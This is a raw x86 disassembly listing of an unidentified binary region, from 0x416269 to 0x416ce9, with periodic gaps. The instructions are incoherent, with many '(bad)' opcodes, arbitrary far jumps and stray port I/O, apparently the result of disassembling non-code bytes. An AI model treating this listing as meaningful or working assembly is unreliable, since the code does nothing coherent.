  416269:	or     eax,0x52d9b48
  41626e:	cmc    
  41626f:	es (bad) 
  416272:	ror    BYTE PTR [eax+0x244866ce],1
  416278:	sbb    ecx,ebx
  41627a:	out    0x6,eax
  41627c:	or     ecx,DWORD PTR [eax+0xccf4869]
  416282:	jp     0x416265
  416284:	sahf   
  416285:	loope  0x416232
  416287:	aaa    
  416288:	dec    eax
  416289:	pop    esi
  41628a:	mov    dl,0xda
  41628c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41628d:	int3   
  41628e:	dec    esp
  41628f:	inc    ebp
  416290:	fwait
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5408:0x93e3bdee
  416305:	jmp    0x0:0x1050000
  41630c:	jbe    0x41635f
  41630e:	cmp    BYTE PTR [ebx+0x17ac5727],ch
  416314:	add    al,0x10
  416316:	mov    ebx,0x7c653882
  41631b:	push   eax
  41631c:	push   edi
  41631d:	imul   ecx,DWORD PTR [eax],0xbd8b97c
  416323:	mov    al,ds:0x29111601
  416328:	test   eax,0x46aa0e16
  41632d:	inc    esp
  41632e:	jl     0x416332
  416330:	sbb    eax,0x2fe097ae
  416335:	and    esi,DWORD PTR [esi-0x3f36fa45]
  41633b:	push   esp
  41633c:	fldcw  WORD PTR [eax+0x5c]
  41633f:	cmc    
  416340:	push   ebx
  416341:	cmp    eax,DWORD PTR [ebp-0x50]
  416344:	inc    esp
  416345:	loop   0x4162f0
  416347:	jmp    0x8ec0:0xaf962513
  41634e:	fisttp WORD PTR [ebx-0x71]
  416351:	dec    edx
  416352:	or     ch,BYTE PTR [edx+0x59]
  416355:	(bad)  
  416356:	adc    eax,ecx
  416358:	test   esi,edx
  41635a:	sub    al,0x87
  41635c:	std    
  41635d:	pop    edx
  41635e:	mul    DWORD PTR [edi+0x5ac31bd1]
  416364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416365:	sub    edx,0xffffff89
  416368:	xchg   DWORD PTR [esi-0x59b25ffd],edx
  41636e:	mov    ah,0x33
  416370:	push   DWORD PTR [esi+ecx*4]
  416373:	sub    eax,0x35c6151b
  416378:	push   edi
  416379:	mov    bh,0xbc
  41637b:	lahf   
  41637c:	not    DWORD PTR [edi-0x7b]
  41637f:	adc    eax,DWORD PTR [eax+eax*4]
  416382:	lods   al,BYTE PTR ds:[esi]
  416383:	and    eax,0xb4bbe709
  416388:	push   edi
  416389:	jl     0x416330
  41638b:	push   edx
  41638c:	shl    ebx,0x4a
  41638f:	jb     0x4163b1
  416391:	popf   
  416392:	outs   dx,DWORD PTR ds:[esi]
  416393:	jg     0x41633c
  416395:	add    dh,BYTE PTR [ebp-0x45]
  416398:	js     0x41635d
  41639a:	ficomp DWORD PTR [eax-0x40ed103]
  4163a0:	xor    ah,dh
  4163a2:	call   0xdab8:0xd080d1d7
  4163a9:	pop    edi
  4163aa:	xchg   esp,eax
  4163ab:	test   DWORD PTR [edi],eax
  4163ad:	call   0x92b6dbe0
  4163b2:	test   DWORD PTR [esi+0x7a],ecx
  4163b5:	pop    ebx
  4163b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b7:	sbb    BYTE PTR ds:0x854272f3,dh
  4163bd:	jnp    0x416433
  4163bf:	cmc    
  4163c0:	pop    esp
  4163c1:	je     0x416344
  4163c3:	repnz push esi
  4163c5:	sub    BYTE PTR [edx+0x33703c69],bl
  4163cb:	mov    ch,0x16
  4163cd:	adc    DWORD PTR [ecx+eax*2],eax
  4163d0:	sbb    eax,0x338d41f0
  4163d5:	dec    esi
  4163d6:	lahf   
  4163d7:	test   DWORD PTR [eax+eax*2+0x38],edx
  4163db:	inc    edx
  4163dc:	arpl   WORD PTR ds:0xb8d98da7,cx
  4163e2:	and    al,0xeb
  4163e4:	pop    ebx
  4163e5:	int3   
  4163e6:	xor    DWORD PTR [edx+esi*2+0x2cf97fa8],ecx
  4163ed:	add    esi,DWORD PTR [edi-0x7c]
  4163f0:	nop
  4163f1:	inc    edx
  4163f2:	pusha  
  4163f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163f4:	mov    edi,0x6d9381d2
  4163f9:	cmp    eax,0x7e26d05c
  4163fe:	imul   esi,ecx,0xffffff99
  416401:	pop    es
  416402:	hlt    
  416403:	pop    ss
  416404:	jbe    0x416437
  416406:	ds nop
  416408:	or     DWORD PTR [ecx],esp
  41640a:	mov    edx,0x1ad4bb2
  41640f:	(bad)  
  416410:	outs   dx,DWORD PTR ds:[esi]
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416481:	jo     0x4164c6
  416483:	in     eax,0x59
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x2a000001,al
  41648d:	mov    ch,0x77
  41648f:	ror    DWORD PTR [edi+0x58b8a213],0x74
  416496:	pop    ss
  416497:	mov    ds:0xacaa9053,al
  41649c:	pop    eax
  41649d:	sub    al,BYTE PTR [eax]
  41649f:	fstp   DWORD PTR [edi]
  4164a1:	xor    DWORD PTR [edx-0x76451735],ebx
  4164a7:	leave  
  4164a8:	scas   al,BYTE PTR es:[edi]
  4164a9:	call   0xddd4:0x95d79029
  4164b0:	push   ebx
  4164b1:	cmp    al,0xef
  4164b3:	mov    ecx,0xc0188013
  4164b8:	ins    BYTE PTR es:[edi],dx
  4164b9:	outs   dx,DWORD PTR ds:[esi]
  4164ba:	aad    0x37
  4164bc:	cmovae esp,DWORD PTR es:[ebp+0x4b]
  4164c1:	xor    eax,0xfd29d6cf
  4164c6:	inc    edi
  4164c7:	in     eax,0xcd
  4164c9:	ss repz xchg ebx,eax
  4164cc:	shl    BYTE PTR [esp+edi*4+0x71],cl
  4164d0:	mov    cl,0x20
  4164d2:	mov    al,0x3a
  4164d4:	jle    0x4164a3
  4164d6:	dec    eax
  4164d7:	popf   
  4164d8:	xor    BYTE PTR [edx-0x1b7d428b],bh
  4164de:	mov    esp,0xa78fce13
  4164e3:	jg     0x416537
  4164e5:	adc    cl,cl
  4164e7:	ret    0xb1aa
  4164ea:	aas    
  4164eb:	mov    ch,BYTE PTR [edi+ebp*4+0x2e]
  4164ef:	push   cs
  4164f0:	push   ebx
  4164f1:	jae    0x4164cc
  4164f3:	dec    ecx
  4164f4:	jb     0x4164da
  4164f6:	dec    ecx
  4164f7:	mov    WORD PTR [edi+0x6b0f43e0],ds
  4164fd:	or     ch,dh
  4164ff:	test   al,0x11
  416501:	enter  0xa7c,0x3
  416505:	push   edx
  416506:	addr16 pop esi
  416508:	sub    al,0x8b
  41650a:	jmp    0x385b:0xfc814e6b
  416511:	in     eax,dx
  416512:	inc    ebp
  416513:	push   cs
  416514:	inc    DWORD PTR [edx+0x26]
  416517:	adc    eax,0x91a0041f
  41651c:	mov    cl,0xe8
  41651e:	data16 jecxz 0x41659e
  416521:	(bad)  
  416522:	pop    ebp
  416523:	mov    ch,0x89
  416525:	xchg   al,bl
  416527:	mov    bl,0xb
  416529:	mov    al,0x1c
  41652b:	adc    BYTE PTR [eax+0x53],dh
  41652e:	and    DWORD PTR [eax+0x112ea438],0xffffffd1
  416535:	mov    ebx,0x756998da
  41653a:	in     al,0x65
  41653c:	aam    0x68
  41653e:	call   0x832a:0x1282b725
  416545:	jbe    0x416583
  416547:	cld    
  416548:	pop    ecx
  416549:	stos   BYTE PTR es:[edi],al
  41654a:	lods   al,BYTE PTR ds:[esi]
  41654b:	test   BYTE PTR [bx+di+0x68],0xb9
  416550:	sub    DWORD PTR [esi],0x3028e2fe
  416556:	das    
  416557:	stos   DWORD PTR es:[edi],eax
  416558:	sbb    eax,0x13b37ed8
  41655d:	rol    BYTE PTR [edi+0x67],cl
  416560:	mov    eax,ds:0x9df3176b
  416565:	lods   al,BYTE PTR ds:[esi]
  416566:	add    eax,0xf0fc4360
  41656b:	ret    0x628c
  41656e:	retf   0xfc38
  416571:	jl     0x416543
  416573:	lock stc 
  416575:	hlt    
  416576:	in     eax,dx
  416577:	inc    ebx
  416578:	lahf   
  416579:	xchg   esp,eax
  41657a:	mov    ecx,0x6b1dd54
  41657f:	call   0xc5506e7a
  416584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416585:	cs aam 0x83
  416588:	imul   ebx,DWORD PTR ds:0x95829dde,0x56
  41658f:	popf   
  416590:	push   esp
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x44b04354]
  416601:	scas   al,BYTE PTR es:[edi]
  416602:	cs jmp 0x105:0xec5e
  41660a:	add    BYTE PTR [eax],al
  41660c:	test   al,0xbe
  41660e:	adc    DWORD PTR [ebp-0xe],0x80061038
  416615:	cmc    
  416616:	outs   dx,BYTE PTR ds:[esi]
  416617:	add    ebx,esp
  416619:	not    BYTE PTR [esi]
  41661b:	inc    esp
  41661c:	or     eax,0xf6ac6542
  416621:	ins    DWORD PTR es:[edi],dx
  416622:	cmp    esp,DWORD PTR [eiz*2-0x7586f54e]
  416629:	scas   eax,DWORD PTR es:[edi]
  41662a:	jle    0x41669e
  41662c:	int    0x9b
  41662e:	sbb    bh,BYTE PTR [esi+eax*8-0x67]
  416632:	or     BYTE PTR [eax],ch
  416634:	outs   dx,DWORD PTR ds:[esi]
  416635:	(bad)  
  416636:	ror    BYTE PTR [eax],0x26
  416639:	mov    al,ds:0xfd6561f0
  41663e:	stos   BYTE PTR es:[edi],al
  41663f:	test   al,0xd8
  416641:	(bad)  
  416642:	div    ebx
  416644:	xchg   ebx,eax
  416645:	pop    ebx
  416646:	fstp   DWORD PTR [edx]
  416648:	push   ecx
  416649:	lds    ecx,FWORD PTR [ebx-0x73]
  41664c:	mov    BYTE PTR [eax],cl
  41664e:	or     BYTE PTR [ecx-0x35],0xa6
  416652:	add    al,0xca
  416654:	ds hlt 
  416656:	jnp    0x4166a9
  416658:	cdq    
  416659:	push   edi
  41665a:	sub    al,0x1a
  41665c:	repz push 0x41d96c4a
  416662:	inc    eax
  416663:	ins    DWORD PTR es:[edi],dx
  416664:	rcr    BYTE PTR [edi+edi*8],0xba
  416668:	adc    eax,0xbaf51f17
  41666d:	jns    0x41669a
  41666f:	mov    ebp,0x869452e4
  416674:	mov    bl,0x5e
  416676:	push   edi
  416677:	and    ah,BYTE PTR [esi]
  416679:	in     al,dx
  41667a:	jno    0x4166d7
  41667c:	dec    ecx
  41667d:	and    dl,0x15
  416680:	aas    
  416681:	repz aas 
  416683:	adc    BYTE PTR [edx+0x44789453],dh
  416689:	jb     0x4166a1
  41668b:	leave  
  41668c:	or     ebp,ebp
  41668e:	jecxz  0x416617
  416690:	addr16 pop ecx
  416692:	bound  edi,QWORD PTR [edi+edi*2]
  416695:	adc    eax,0x6c09b4f0
  41669a:	mov    al,0x8e
  41669c:	xor    dl,BYTE PTR [esi+0x1ed3f46]
  4166a2:	cmp    bh,al
  4166a4:	fnsavew [ebx]
  4166a7:	out    0xa7,eax
  4166a9:	add    eax,0x312d6bad
  4166ae:	into   
  4166af:	imul   ebp,DWORD PTR [esi],0x42
  4166b2:	int3   
  4166b3:	cli    
  4166b4:	repz into 
  4166b6:	ins    DWORD PTR es:[edi],dx
  4166b7:	test   edi,ecx
  4166b9:	mov    eax,0xa5bd5973
  4166be:	sbb    ebp,DWORD PTR [edi-0x55e469b7]
  4166c4:	(bad)  
  4166c5:	stc    
  4166c6:	popa   
  4166c7:	push   ss
  4166c8:	jae    0x4166fa
  4166ca:	or     ch,al
  4166cc:	add    DWORD PTR ds:0xc42c3e0a,ecx
  4166d2:	inc    eax
  4166d3:	or     ecx,0x2bfc4659
  4166d9:	(bad)  
  4166da:	adc    ecx,ebp
  4166dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166dd:	cmp    al,BYTE PTR ds:0xe08cd403
  4166e3:	inc    eax
  4166e4:	jmp    0x416666
  4166e6:	mov    esp,0xf954d7fc
  4166eb:	push   cs
  4166ec:	jge    0x416698
  4166ee:	and    BYTE PTR [esi+0x4c],dl
  4166f1:	and    dh,cl
  4166f3:	(bad)  
  4166f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f5:	test   al,0x20
  4166f7:	sub    edi,esi
  4166f9:	mov    ecx,0x17c5e657
  4166fe:	or     bl,BYTE PTR [ebx+edi*8+0x1d]
  416702:	je     0x41668c
  416704:	sbb    ah,dl
  416706:	pop    es
  416707:	jge    0x4166cc
  416709:	test   al,0x4a
  41670b:	jnp    0x416731
  41670d:	in     eax,dx
  41670e:	add    ebx,DWORD PTR [ecx+0x3c]
	...
  416771:	add    BYTE PTR [eax],al
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	mov    ch,0x5b
  416782:	aam    0xa9
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x14000001
  41678d:	pop    ss
  41678e:	xchg   BYTE PTR [edi-0x42eae0f],dh
  416794:	je     0x4167e5
  416796:	sahf   
  416797:	into   
  416798:	sti    
  416799:	xchg   ebp,eax
  41679a:	mov    cl,0x6a
  41679c:	ins    DWORD PTR es:[edi],dx
  41679d:	loopne 0x416808
  41679f:	lods   al,BYTE PTR ds:[esi]
  4167a0:	fdiv   QWORD PTR [esi+0x6a]
  4167a3:	(bad)  
  4167a4:	push   edi
  4167a5:	mov    BYTE PTR [esp+edx*2-0x67e3bbb9],dl
  4167ac:	in     al,dx
  4167ad:	sahf   
  4167ae:	scas   al,BYTE PTR es:[edi]
  4167af:	fdivr  QWORD PTR [ecx-0x6f]
  4167b2:	stc    
  4167b3:	and    DWORD PTR [ebp+0x524cb31],edi
  4167b9:	pop    eax
  4167ba:	adc    BYTE PTR [ecx-0x5e],dl
  4167bd:	dec    edi
  4167be:	into   
  4167bf:	inc    DWORD PTR [ecx-0x69d1d082]
  4167c5:	cdq    
  4167c6:	in     eax,dx
  4167c7:	hlt    
  4167c8:	mov    dl,0x28
  4167ca:	and    dh,ah
  4167cc:	(bad)  
  4167ce:	out    0x4d,al
  4167d0:	mov    eax,ds:0x8467ff3d
  4167d5:	ret    
  4167d6:	inc    eax
  4167d7:	out    dx,eax
  4167d8:	mov    ebx,DWORD PTR [ebx+0x4a]
  4167db:	jmp    0x4167e7
  4167dd:	dec    esp
  4167de:	cs mov ah,0x72
  4167e1:	idiv   BYTE PTR [ebx+edx*2]
  4167e4:	test   eax,0x93c79875
  4167e9:	cdq    
  4167ea:	dec    edx
  4167eb:	mov    edi,DWORD PTR [edi]
  4167ed:	push   0xd818959f
  4167f2:	lahf   
  4167f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f4:	cmp    DWORD PTR [edx],ebx
  4167f6:	add    al,0x6b
  4167f8:	add    esp,DWORD PTR [ecx+0x25]
  4167fb:	mov    dl,0xbc
  4167fd:	push   edi
  4167fe:	push   0x32
  416800:	mov    ebp,0x4f3fcb6
  416805:	loope  0x416829
  416807:	mov    ah,0x54
  416809:	and    DWORD PTR [ecx-0x265a0bb7],esi
  41680f:	shr    DWORD PTR [ebx-0x36],0xbd
  416813:	arpl   bx,ax
  416815:	bound  ecx,QWORD PTR [ebp-0xffeb374]
  41681b:	rep stos DWORD PTR es:[edi],eax
  41681d:	cwde   
  41681e:	retf   0x8fe5
  416821:	jle    0x4167f0
  416823:	xchg   ebx,eax
  416824:	jmp    0x99fb2b3e
  416829:	das    
  41682a:	xchg   esi,eax
  41682b:	xchg   BYTE PTR [edx-0x19],dl
  41682e:	xchg   ebx,eax
  41682f:	jmp    0x2562:0x6039c687
  416836:	loop   0x4167d1
  416838:	mov    esp,0xab177417
  41683d:	push   0xe825eb04
  416842:	sti    
  416843:	pushf  
  416844:	mov    BYTE PTR [eax+0x58],bl
  416847:	mov    ebx,0xa75f5237
  41684c:	push   ecx
  41684d:	call   0xcc73f88
  416852:	jmp    0xc719a831
  416857:	xor    BYTE PTR ds:[edi+0x1294a726],al
  41685e:	scas   al,BYTE PTR es:[edi]
  41685f:	dec    ebx
  416860:	mov    ah,0x33
  416862:	fwait
  416863:	push   0x11
  416865:	xor    DWORD PTR [ecx-0x510beecb],ecx
  41686b:	sub    eax,0x3e3384f9
  416870:	lea    eax,[edi]
  416872:	push   esi
  416873:	or     ch,BYTE PTR [eax-0x7e]
  416876:	xor    cl,BYTE PTR [esi-0xa]
  416879:	mov    dl,BYTE PTR [esi+0x50]
  41687c:	dec    ebp
  41687d:	pop    ss
  41687e:	jle    0x41681c
  416880:	shl    DWORD PTR [ecx-0xe32839a],0x99
  416887:	jne    0x41689f
  416889:	ins    BYTE PTR es:[edi],dx
  41688a:	les    ebp,FWORD PTR [eax]
  41688c:	mov    eax,0xf67e4a7d
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x58d7df5e
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    ah,ch
  41690d:	pop    ss
  41690e:	outs   dx,BYTE PTR ds:[esi]
  41690f:	pop    es
  416910:	loopne 0x41689b
  416912:	les    ecx,FWORD PTR [ecx+edi*8]
  416915:	shl    BYTE PTR [esi+0xaabc2c2],cl
  41691b:	mov    dh,BYTE PTR [ebx+0x2c]
  41691e:	xchg   esi,eax
  41691f:	adc    al,0x2e
  416921:	in     eax,dx
  416922:	mov    al,0x3b
  416924:	adc    eax,DWORD PTR [esi-0x3e]
  416927:	int    0xb0
  416929:	pusha  
  41692a:	xor    ecx,esp
  41692c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41692d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41692e:	std    
  41692f:	stc    
  416930:	les    esi,FWORD PTR [edi]
  416932:	push   es
  416933:	in     eax,dx
  416934:	bound  ebx,QWORD PTR [edi+0xf]
  416937:	cmp    BYTE PTR [esi-0x59c90309],0xa5
  41693e:	sub    eax,0xb941333
  416943:	jne    0x416974
  416945:	push   esp
  416946:	(bad)  
  416947:	shl    edi,cl
  416949:	pop    esi
  41694a:	sub    al,0x24
  41694c:	jecxz  0x4169a2
  41694e:	imul   ecx,DWORD PTR [ecx],0x65
  416951:	cs scas eax,DWORD PTR es:[edi]
  416953:	adc    DWORD PTR [eax-0x50896650],0x62d467dd
  41695d:	mov    ah,0xa0
  41695f:	push   ecx
  416960:	push   ecx
  416961:	cmc    
  416962:	jmp    0x416908
  416964:	aad    0xd0
  416966:	in     al,0x8
  416968:	cmp    eax,0x3d32a561
  41696d:	cmp    al,bh
  41696f:	push   ebx
  416970:	icebp  
  416971:	or     DWORD PTR [ebx-0x41],edi
  416974:	ds push edi
  416976:	pop    ecx
  416977:	test   BYTE PTR [esp+ebx*4],dh
  41697a:	xchg   edi,eax
  41697b:	(bad)  
  41697c:	call   0x6fb6aa42
  416981:	or     ebx,esi
  416983:	call   DWORD PTR [ebx]
  416985:	loop   0x4169c8
  416987:	adc    ch,cl
  416989:	xor    eax,0xcaaf7158
  41698e:	aam    0xe7
  416990:	xchg   esp,eax
  416991:	in     eax,dx
  416992:	jl     0x4169b4
  416994:	adc    al,ch
  416996:	mov    eax,0x6220ba33
  41699b:	(bad)  
  41699c:	mov    dl,0x99
  41699e:	loopne 0x4169cb
  4169a0:	(bad)  [eax+ecx*1]
  4169a3:	cld    
  4169a4:	in     eax,0x8b
  4169a6:	mov    WORD PTR [esi+0x1c],cs
  4169a9:	adc    eax,0x5c5d1d10
  4169ae:	sahf   
  4169af:	dec    ecx
  4169b0:	jg     0x4169ad
  4169b2:	push   ebx
  4169b3:	xchg   ebx,eax
  4169b4:	div    DWORD PTR [ebx+esi*4+0x46]
  4169b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b9:	retf   0x9a1d
  4169bc:	jp     0x416a16
  4169be:	dec    ecx
  4169bf:	cmp    BYTE PTR [edx+0x500d49ae],bh
  4169c5:	push   0x96453402
  4169ca:	inc    eax
  4169cb:	or     eax,0xdd7d6a15
  4169d0:	iret   
  4169d1:	sub    ah,ah
  4169d3:	int3   
  4169d4:	les    ecx,FWORD PTR [eax-0x15802081]
  4169da:	xlat   BYTE PTR ds:[ebx]
  4169db:	mov    ds:0xed05f1e5,eax
  4169e0:	pop    esp
  4169e1:	cmp    al,0xc6
  4169e3:	(bad)  
  4169e4:	jl     0x4169a4
  4169e6:	jg     0x416996
  4169e8:	sbb    ch,ah
  4169ea:	and    al,0x39
  4169ec:	xor    dl,BYTE PTR [esi-0x70]
  4169ef:	scas   eax,DWORD PTR es:[edi]
  4169f0:	mov    ebx,0xdcf03882
  4169f5:	push   0x30
  4169f7:	dec    edi
  4169f8:	xor    ah,0x3e
  4169fb:	pop    ebx
  4169fc:	sub    cl,BYTE PTR [esp+esi*4+0x53b996f6]
  416a03:	and    eax,0x9ba0adb6
  416a08:	dec    eax
  416a09:	retf   
  416a0a:	in     al,dx
  416a0b:	pop    esi
  416a0c:	and    eax,0xc6689767
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x67410ba3
  416a82:	pop    es
  416a83:	fs ins DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x77000001
  416a8d:	stc    
  416a8e:	jae    0x416a51
  416a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a91:	xlat   BYTE PTR ds:[ebx]
  416a92:	jns    0x416aae
  416a94:	push   esi
  416a95:	data16 xchg BYTE PTR [eax-0x4a],bl
  416a99:	push   cs
  416a9a:	and    cl,BYTE PTR [eax+0x1e]
  416a9d:	(bad)  
  416a9f:	call   0x81c2:0x21563c39
  416aa6:	or     DWORD PTR [edx],esi
  416aa8:	add    ebx,DWORD PTR [ebp+0x9]
  416aab:	adc    BYTE PTR [edx-0x6b46f2fe],0xb0
  416ab2:	test   BYTE PTR [ebx],0xc5
  416ab5:	add    DWORD PTR [esi-0x12],0x34
  416ab9:	dec    edi
  416aba:	fs int 0x7e
  416abd:	mov    ecx,0xdce3e1d3
  416ac2:	sar    DWORD PTR [esi],1
  416ac4:	popa   
  416ac5:	sbb    bh,bh
  416ac7:	jmp    0xbd34301a
  416acc:	inc    ebp
  416acd:	jle    0x416acb
  416acf:	cmc    
  416ad0:	inc    eax
  416ad1:	jns    0x416ad3
  416ad3:	lods   al,BYTE PTR ds:[esi]
  416ad4:	frstor [ecx+0x755d925c]
  416ada:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416adc:	test   eax,ebx
  416ade:	rol    DWORD PTR [ecx],1
  416ae0:	jmp    0xeaebf788
  416ae5:	mov    dh,0xae
  416ae7:	iret   
  416ae8:	pop    ecx
  416ae9:	pop    esp
  416aea:	icebp  
  416aeb:	pop    ecx
  416aec:	lods   eax,DWORD PTR ds:[esi]
  416aed:	mov    dl,BYTE PTR [edx-0x6f6bfcdf]
  416af3:	stc    
  416af4:	jno    0x416ad7
  416af6:	outs   dx,BYTE PTR ds:[esi]
  416af7:	bnd ja 0x416b19
  416afa:	pushf  
  416afb:	out    0x34,eax
  416afd:	out    dx,eax
  416afe:	jnp    0x416b31
  416b00:	push   ds
  416b01:	xor    BYTE PTR [edi+ecx*8+0x5b83ebd],ch
  416b08:	ret    0x3fbe
  416b0b:	pop    esi
  416b0c:	or     eax,0x737b10f4
  416b11:	dec    ebx
  416b12:	lock in eax,0x82
  416b15:	mov    bh,0x7
  416b17:	push   esi
  416b18:	loope  0x416b11
  416b1a:	aas    
  416b1b:	gs mov al,0xca
  416b1e:	mov    ah,cl
  416b20:	inc    eax
  416b21:	sub    DWORD PTR [esi*4+0xa3504],edi
  416b28:	sub    al,0xf5
  416b2a:	or     DWORD PTR [edi-0x4cdb8ec],ecx
  416b30:	js     0x416ab2
  416b32:	mov    edi,0x86a95352
  416b38:	xchg   ebp,eax
  416b39:	cmp    dl,BYTE PTR [esi]
  416b3b:	aas    
  416b3c:	mov    ds:0xd4b2b028,al
  416b41:	and    eax,0x9b21b30b
  416b46:	stos   DWORD PTR es:[edi],eax
  416b47:	mov    BYTE PTR [ebx+0x7b],al
  416b4a:	push   0x362dc0b9
  416b4f:	and    dl,bh
  416b51:	icebp  
  416b52:	adc    ebx,DWORD PTR [edx]
  416b54:	mov    esp,0x51037088
  416b59:	in     eax,dx
  416b5a:	cmc    
  416b5b:	xor    al,0x11
  416b5d:	popf   
  416b5e:	jl     0x416afd
  416b60:	xchg   ecx,eax
  416b61:	mov    edx,0x9df1209b
  416b66:	add    DWORD PTR [edx+0x41bf4970],ebx
  416b6c:	inc    edx
  416b6d:	dec    edx
  416b6e:	cld    
  416b6f:	repz xchg esp,eax
  416b71:	ss test al,0xf7
  416b74:	sub    edi,DWORD PTR [ebp-0x8b1b9fa]
  416b7a:	mov    DWORD PTR ds:0x1fed738,edx
  416b80:	ss jnp 0x416b2a
  416b83:	inc    ebx
  416b84:	jne    0x416c01
  416b86:	les    eax,FWORD PTR [eax+0x6e71cf12]
  416b8c:	xor    ah,BYTE PTR [esi+0xc13786]
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x255b70a9
  416c01:	fst    QWORD PTR [esi]
  416c03:	shl    DWORD PTR [edx-0x10],cl
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0xd5000001
  416c0d:	(bad)  
  416c0e:	mov    gs:0xe986f6cf,al
  416c14:	mov    ah,ah
  416c16:	ja     0x416c6f
  416c18:	and    eax,0x4888b12b
  416c1d:	test   eax,0x7740e029
  416c22:	sbb    DWORD PTR [ebx+0x1e],eax
  416c25:	mov    esi,0x33026664
  416c2a:	sbb    esp,DWORD PTR [eax]
  416c2c:	out    dx,eax
  416c2d:	jmp    0x416c61
  416c2f:	sahf   
  416c30:	sbb    al,0xa7
  416c32:	cmp    DWORD PTR [edx-0x1e4f3cb7],eax
  416c38:	inc    ecx
  416c39:	mov    ebx,0x46e449eb
  416c3e:	je     0x416c10
  416c40:	idiv   ch
  416c42:	sbb    dh,ch
  416c44:	dec    ebx
  416c45:	fwait
  416c46:	and    al,0x39
  416c48:	xchg   edx,eax
  416c49:	cdq    
  416c4a:	sbb    al,0xe1
  416c4c:	adc    eax,0xbd7da4ec
  416c51:	pop    ecx
  416c52:	xchg   ebx,edi
  416c54:	and    esi,DWORD PTR [eax]
  416c56:	retf   0x39b5
  416c59:	ss pop esp
  416c5b:	les    eax,FWORD PTR [ecx+ecx*4]
  416c5e:	and    al,0xcc
  416c60:	jecxz  0x416c91
  416c62:	xchg   esi,eax
  416c63:	test   DWORD PTR [edx-0x2864f582],esp
  416c69:	stos   BYTE PTR es:[edi],al
  416c6a:	sub    ch,BYTE PTR [ebp-0x75]
  416c6d:	rol    DWORD PTR [eax+edi*8+0x441bbe43],1
  416c74:	sub    bl,BYTE PTR [ebx+eiz*1]
  416c77:	(bad)  
  416c78:	push   eax
  416c79:	ret    0xe95e
  416c7c:	imul   ebp,DWORD PTR [eax+0x61cc67c4],0x24e49025
  416c86:	jnp    0x416c12
  416c88:	pushf  
  416c89:	add    eax,0x2c3b1794
  416c8e:	int3   
  416c8f:	int3   
  416c90:	push   ds
  416c91:	daa    
  416c92:	gs into 
  416c94:	fs jnp 0x416d0c
  416c97:	cmc    
  416c98:	mov    bl,0x51
  416c9a:	das    
  416c9b:	mov    al,0x7b
  416c9d:	fsub   st(0),st
  416c9f:	sub    DWORD PTR [eax+0x7e7f56e0],0xffffffc1
  416ca6:	sti    
  416ca7:	enter  0x735b,0x1a
  416cab:	jns    0x416ccf
  416cad:	ins    DWORD PTR es:[edi],dx
  416cae:	shr    BYTE PTR [esi],cl
  416cb0:	sub    eax,0x6338106b
  416cb5:	mov    dl,0xc9
  416cb7:	jmp    0x28ae:0xd9f70cc8
  416cbe:	in     eax,dx
  416cbf:	ins    DWORD PTR es:[edi],dx
  416cc0:	pop    ebx
  416cc1:	rcl    BYTE PTR [edx],cl
  416cc3:	dec    ebp
  416cc4:	xchg   edx,eax
  416cc5:	push   es
  416cc6:	shl    BYTE PTR [ebp-0x55],0x18
  416cca:	mov    DWORD PTR [edx-0x645658],edx
  416cd0:	dec    ebx
  416cd1:	nop    edx
  416cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd5:	mov    cl,0x1d
  416cd7:	sahf   
  416cd8:	and    ecx,ebx
  416cda:	adc    eax,0x16259598
  416cdf:	mov    ebp,ebp
  416ce1:	sti    
  416ce2:	scas   eax,DWORD PTR es:[edi]
  416ce3:	test   BYTE PTR [esi-0x10d652eb],ah
  416ce9:	adc    ah,BYTE PTR [edx-0x40]
